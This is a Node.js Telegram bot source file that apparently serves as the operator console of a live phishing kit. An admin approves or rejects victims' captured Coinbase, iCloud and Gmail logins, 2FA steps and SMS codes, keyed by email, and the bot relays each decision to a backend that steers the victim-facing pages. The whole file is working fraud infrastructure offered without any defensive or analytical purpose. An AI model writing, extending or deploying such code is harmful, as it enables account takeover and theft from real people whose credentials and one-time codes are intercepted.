const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing env vars");
  process.exit(1);
}

const bot = new TelegramBot(BOT_TOKEN, {
  polling: { autoStart: true, params: { timeout: 10 } }
});

bot.getMe().then(() => {
  console.log(`✅ Bot connected`);
}).catch(err => {
  console.error("❌ Bot failed:", err.message);
});

const handledCallbacks = new Set();

bot.on("callback_query", async (query) => {
  const callbackId = query.id;
  
  if (handledCallbacks.has(callbackId)) return;
  handledCallbacks.add(callbackId);

  try {
    const [action, email] = query.data.split("|");

    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : action === "gmail_accept" ? "GMAIL ACCEPT" : action === "gmail_reject" ? "GMAIL REJECT" : "REJECT"}`);

    // ✅ Map iCloud accept/reject to correct status
    let statusForBackend = action;
    if (action === "page_accept") {
      statusForBackend = "accepted";
    } else if (action === "page_reject") {
      statusForBackend = "rejected";
    } else if (action === "sms_accept") {
      statusForBackend = "accepted";
    } else if (action === "sms_reject") {
      statusForBackend = "rejected";
    } else if (action === "gmail_accept") {
      statusForBackend = "accepted";
    } else if (action === "gmail_reject") {
      statusForBackend = "rejected";
    }

    const response = await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email,
        status: statusForBackend
      })
    });

    // Also handle iCloud page status updates
    if (action.includes("page_")) {
      await fetch(`${APP_URL}/update-page-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, status: action })
      });
    }

    // Also handle SMS status updates
    if (action.includes("sms_")) {
      await fetch(`${APP_URL}/update-sms-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, status: action })
      });
    }

    // Handle redirection choices
    if (action.includes("redirect_")) {
      await fetch(`${APP_URL}/update-redirection-choice`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, choice: action })
      });
    }

    if (response.ok) {
      // Remove buttons from original message by editing reply_markup
      try {
        const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
        await fetch(editUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            message_id: query.message?.message_id,
            reply_markup: JSON.stringify({ inline_keyboard: [] })  // ✅ Empty buttons!
          })
        });
      } catch (err) {}

      // Send status reply
      let statusMessage = "";
      console.log(`📋 Building status message for action: ${action}, email: ${email}`);
      
      if (action === "page1") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "page2") {
        statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
      } else if (action === "reject") {
        statusMessage = `📧 <code>${email}</code> Coinbase Login <b>REJECTED</b>! ❌`;
      } else if (action === "page_accept") {
        statusMessage = `☁️ <code>${email}</code> iCloud Login <b>ACCEPTED</b>! ✅`;
        console.log(`✅ PAGE_ACCEPT matched! Message: ${statusMessage}`);
      } else if (action === "page_reject") {
        statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
        console.log(`❌ PAGE_REJECT matched! Message: ${statusMessage}`);
      } else if (action === "sms_accept") {
        statusMessage = `📱 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
      } else if (action === "sms_reject") {
        statusMessage = `📱 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
      } else if (action === "redirect_icloud") {
        statusMessage = `☁️ <code>${email}</code> redirected to <b>iCloud</b>! ✅`;
      } else if (action === "redirect_gmail") {
        statusMessage = `🌈 <code>${email}</code> redirected to <b>Gmail</b>! ✅`;
      } else if (action === "gmail_accept") {
        statusMessage = `🌈 <code>${email}</code> Gmail Login <b>ACCEPTED</b>! ✅`;
        console.log(`✅ GMAIL_ACCEPT matched! Message: ${statusMessage}`);
      } else if (action === "gmail_reject") {
        statusMessage = `🌈 <code>${email}</code> Gmail Login <b>REJECTED</b>! ❌`;
        console.log(`❌ GMAIL_REJECT matched! Message: ${statusMessage}`);
      }

      console.log(`📨 Final statusMessage: "${statusMessage}"`);

      // ✅ SEND THE MESSAGE
      if (statusMessage) {
        try {
          const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          console.log(`🚀 Sending message to Telegram...`);
          await fetch(replyUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID,
              text: statusMessage,
              parse_mode: "HTML"
            })
          });
          console.log(`✅ Message sent successfully!`);
        } catch (err) {
          console.error(`❌ Failed to send status message:`, err);
        }
      } else {
        console.log(`⚠️ statusMessage is empty, not sending`);
      }
    }

    bot.answerCallbackQuery(callbackId, {
      text: `✅ ${action.toUpperCase()}`,
      show_alert: false
    }).catch(() => {});

  } catch (err) {
    console.error("❌ Error:", err.message);
    bot.answerCallbackQuery(query.id, {
      text: "❌ Error",
      show_alert: true
    }).catch(() => {});
  }
});

console.log(`✅ Bot ready`);

module.exports = { bot };

// ============================================================================
// ICLOUD CALLBACK HANDLERS
// ============================================================================

// Note: Add this inside the bot.on("callback_query") handler
// When processing callbacks, add these patterns:
// - page_accept|${email} → set pendingPage[email].status = "accepted"
// - page_reject|${email} → set pendingPage[email].status = "rejected"
// - sms_accept|${code} → set pendingCodes[code].status = "accepted"
// - sms_reject|${code} → set pendingCodes[code].status = "rejected"

// The callback handler should already be processing these patterns
// Just ensure it hits the right endpoints for iCloud
